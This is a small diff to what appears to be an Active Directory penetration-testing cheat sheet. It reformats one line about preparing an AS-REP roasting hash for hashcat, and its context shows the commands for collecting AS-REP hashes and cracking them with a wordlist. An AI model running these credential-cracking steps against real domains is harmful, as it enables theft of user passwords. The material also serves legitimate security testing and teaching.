@@ -241,7 +241,7 @@ Invoke-ASREPRoast -Verbose | fl
 ```
 
 #### Crack the hash with hashcat
-Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
+```Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......```
 ```
 Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
